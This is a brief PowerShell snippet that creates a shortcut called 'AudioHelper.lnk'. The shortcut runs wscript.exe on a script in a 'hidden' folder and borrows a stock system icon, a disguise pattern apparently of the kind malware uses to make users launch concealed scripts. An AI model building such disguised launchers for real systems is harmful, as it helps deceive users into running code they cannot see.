$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("AudioHelper.lnk")
$shortcut.TargetPath = "wscript.exe"
$shortcut.Arguments = "hidden\AudioHost.vbs"
$shortcut.WorkingDirectory = ".\"
$shortcut.IconLocation = "shell32.dll,34"
$shortcut.Save()
